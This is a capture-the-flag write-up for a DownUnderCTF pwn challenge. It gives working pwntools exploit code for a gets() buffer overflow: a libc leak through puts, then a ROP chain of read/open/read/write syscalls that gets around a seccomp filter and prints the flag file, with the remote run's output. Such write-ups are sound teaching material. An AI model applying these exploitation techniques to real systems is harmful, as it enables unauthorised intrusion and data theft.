# DownUnderCTF

## Return to what's revenge

> 442
>
> Author: Faith
>
> My friends kept making fun of me, so I hardened my program even further!
> 
> The flag is located at `/chal/flag.txt`.
>
> `nc chal.duc.tf 30006`
>
> Attached files:
>
>    * [return-to-whats-revenge](return-to-whats-revenge) (sha256: 489734ecb8d2595faf11033f34724171cbb96a15e10183f3b17ef4c7090b8ebc)


Tags: _pwn_ _x86-64_ _remote-shell_ _rop_ _bof_ _syscall_


## Summary

`gets`... yet, again.  

This is the same as [_return-to-what_](https://github.com/datajerk/ctf-write-ups/tree/master/downunderctf2020/return_to_what) plus seccomp.


## Analysis

### Checksec

```
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

No shellcode _and_ no GOT overwrite, so, a bit more secure than [_return-to-what_](https://github.com/datajerk/ctf-write-ups/tree/master/downunderctf2020/return_to_what), but that's about it.


### Decompile with Ghidra

```c
void vuln(void)
{
  char name [40];
  
  puts("Where would you like to return to?");
  gets(name);
  return;
}
```

`gets` vulnerability.  Easy ROP since no canary or PIE.  To get to the return address send `0x38` bytes (see Ghidra `vuln` function stack diagram to get the offset of `0x38`).

While in Ghidra poke around the functions in the Symbol Tree and you'll see `seccomp_bpf_label`.


### Seccomp dump

```bash
# seccomp-tools dump ./return-to-whats-revenge
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x01 0x00 0xc000003e  if (A == ARCH_X86_64) goto 0003
 0002: 0x06 0x00 0x00 0x00000000  return KILL
 0003: 0x20 0x00 0x00 0x00000000  A = sys_number
 0004: 0x15 0x00 0x01 0x0000000f  if (A != rt_sigreturn) goto 0006
 0005: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0006: 0x15 0x00 0x01 0x000000e7  if (A != exit_group) goto 0008
 0007: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0008: 0x15 0x00 0x01 0x0000003c  if (A != exit) goto 0010
 0009: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0010: 0x15 0x00 0x01 0x00000002  if (A != open) goto 0012
 0011: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0012: 0x15 0x00 0x01 0x00000000  if (A != read) goto 0014
 0013: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0014: 0x15 0x00 0x01 0x00000001  if (A != write) goto 0016
 0015: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0016: 0x15 0x00 0x01 0x0000000c  if (A != brk) goto 0018
 0017: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0018: 0x15 0x00 0x01 0x00000009  if (A != mmap) goto 0020
 0019: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0020: 0x15 0x00 0x01 0x0000000a  if (A != mprotect) goto 0022
 0021: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0022: 0x15 0x00 0x01 0x00000003  if (A != close) goto 0024
 0023: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0024: 0x06 0x00 0x00 0x00000000  return KILL
```

This is essentially our whitelist.  So the _get-a-shell_ that worked with [_return-to-what_](https://github.com/datajerk/ctf-write-ups/tree/master/downunderctf2020/return_to_what) will not work here since `execve` is not whitelisted.
 
Options:

* [Sigreturn-oriented programming](https://en.wikipedia.org/wiki/Sigreturn-oriented_programming).  Examples [here](https://github.com/datajerk/ctf-write-ups/tree/master/nahamconctf2020/syrup) and [here](https://docs.pwntools.com/en/stable/rop/rop.html#rop-sigreturn).
* brk/mmap/mprotect -> shellcode
* brk/mmap/open/read/write to allocate heap buffers, then read in the file name from stdin, open the file, read in the contents, write to stdout.  E.g. [SaaS](https://github.com/datajerk/ctf-write-ups/tree/master/nahamconctf2020/saas)

However there's a simpler way that does not require having to emit RAX (e.g. heap location from brk).


## Exploit development

### Get rid of that alarm

```python
#!/usr/bin/env python3

from pwn import *

binary = ELF('return-to-whats-revenge')
binary.asm(binary.symbols['alarm'], 'ret')
binary.save('return-to-whats-revenge_noalarm')
os.chmod('return-to-whats-revenge_noalarm',0o755)
```

There's multiple ways to handle this, including directly from GDB, but I prefer to just have a patched binary.


## Exploit

### Setup

```python
#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF('./return-to-whats-revenge_noalarm')
context.log_level = 'INFO'

if not args.REMOTE:
    context.log_file = 'local.log'
    libc = binary.libc
    p = process(binary.path)
else:
    context.log_file = 'remote.log'
    p = remote('chal.duc.tf', 30006)
```

Boilerplate pwntools.  `context.binary` is important for ROP.  Also notice there's no `libc` set for `REMOTE` since we have to find it first.


### Leak libc

```python
# 1st pass: leak libc
rop = ROP([binary])
pop_rdi = rop.find_gadget(['pop rdi','ret'])[0]

payload  = 0x38 * b'A'
payload += p64(pop_rdi)
payload += p64(binary.got.puts)
payload += p64(binary.plt.puts)
payload += p64(binary.sym.vuln)

p.sendlineafter('Where would you like to return to?\n',payload)

_ = p.recv(6)
puts = u64(_ + b'\0\0')
log.info('puts: ' + hex(puts))
if not 'libc' in locals():
    try:
        import requests
        r = requests.post('https://libc.rip/api/find', json = {'symbols':{'puts':hex(puts)[-3:]}})
        libc_url = r.json()[0]['download_url']
        libc_file = libc_url.split('/')[-1:][0]
        if not os.path.exists(libc_file):
            log.info('getting: ' + libc_url)
            r = requests.get(libc_url, allow_redirects=True)
            open(libc_file,'wb').write(r.content)
    except:
        log.critical('get libc yourself!')
        sys.exit(0)
    libc = ELF(libc_file)
libc.address = puts - libc.sym.puts
log.info('libc.address: ' + hex(libc.address))
```

Above is identical to [_return-to-what_](https://github.com/datajerk/ctf-write-ups/tree/master/downunderctf2020/return_to_what).  Read that for details.


### Get a shell, get the flag

```python
# 2nd pass: get flag
def syscall(rax=None,rdi=None,rsi=None,rdx=None,r10=None,r9=None,r8=None):
    assert(rax != None)
    payload = b''
    if rdi != None: payload += p64(pop_rdi) + p64(rdi)
    if rsi != None: payload += p64(pop_rsi) + p64(rsi)
    if rdx != None: payload += p64(pop_rdx) + p64(rdx)
    if r10 != None: payload += p64(pop_r10) + p64(r10)
    return payload + p64(pop_rax) + p64(rax) + p64(sys_ret)

try:
    rop = ROP([binary,libc])
    pop_rax = rop.find_gadget(['pop rax','ret'])[0]
    pop_rdi = rop.find_gadget(['pop rdi','ret'])[0]
    pop_rsi = rop.find_gadget(['pop rsi','ret'])[0]
    pop_rdx = list(libc.search(asm('pop rdx; ret')))[0]
    pop_r10 = list(libc.search(asm('pop r10; ret')))[0]
    sys_ret = list(libc.search(asm('syscall; ret')))[0]
except:
    log.info('no ROP for you!')
    sys.exit(0)
```

Above is simple `syscall` function to build _syscall_ payloads followed by a `try` block to _try_ to find all the ROP gadgets we'll need for syscalls.  pwntools fails to find a lot of gadgets, so the fallback is the `libc.search` statement.

None of the syscalls in this exploit require `r9` or `r8`, so I omitted them (they're not there anyway, at least not as simple pop/ret pairs).

```python
flagfile = '/chal/flag.txt'
filesize = 100 # guess?

fd = 3
payload  = 0x38 * b'A'
payload += syscall(constants.SYS_read.real,constants.STDIN_FILENO.real,binary.bss()+0x30,len(flagfile))
payload += syscall(constants.SYS_open.real,binary.bss()+0x30,0,0)
payload += syscall(constants.SYS_read.real,fd,binary.bss()+0x40,filesize)
payload += syscall(constants.SYS_write.real,constants.STDOUT_FILENO.real,binary.bss()+0x40,filesize)

p.sendlineafter('Where would you like to return to?\n',payload)
p.send(flagfile)
log.info(p.recv(filesize).split(b'\n')[0])
```

After the same `0x38` padding used in the last two ([_Shell this!_](https://github.com/datajerk/ctf-write-ups/tree/master/downunderctf2020/shellthis) and [_return-to-what_](https://github.com/datajerk/ctf-write-ups/tree/master/downunderctf2020/return_to_what)), four syscalls will liberate the flag:

1. Read the name of the file from stdin and store 0x30 bytes from the start of the BSS.  This saves us the hassle of using brk, et al and having to deal with RAX.  The first 0x30 bytes of the BSS is used for stdin/stdout/stderr hence the `+0x30`.  The BSS isn't huge, but huge enough for a flag.
2. Open the file by name.
3. Read the file contents into `BSS+0x40`.  Notice that `fd` is hardcoded to `3` and it should always be `3` (well, not _always_).  `RAX` has the value of `fd` after the `open` syscall, but then it'd be more work to get it.  `3` is a safe guess and works (it usually does for these type of challenges).
4. Write the file contents to stdout.  The filesize is a guess, the assumption is that the flag is not 100 characters in length.  `RAX` after the file read contains the length of the file, but again, let's be lazy.

After crafting this rather large payload, just send; the payload will execute and wait for the name of the flag file to be sent.  After that, the flag is written to stdout.

Output:

```
# ./exploit.py REMOTE=1
[*] '/pwd/datajerk/downunderctf2020/return_to_whats_revenge/return-to-whats-revenge_noalarm'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Opening connection to chal.duc.tf on port 30006: Done
[*] Loaded 14 cached gadgets for './return-to-whats-revenge_noalarm'
[*] puts: 0x7fc23c2a49c0
[*] getting: https://libc.rip/download/libc6_2.27-3ubuntu1_amd64.so
[*] '/pwd/datajerk/downunderctf2020/return_to_whats_revenge/libc6_2.27-3ubuntu1_amd64.so'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] libc.address: 0x7fc23c224000
[*] Loaded 196 cached gadgets for 'libc6_2.27-3ubuntu1_amd64.so'
[*] b'DUCTF{secc0mp_noT_$tronk_eno0Gh!!@}'
```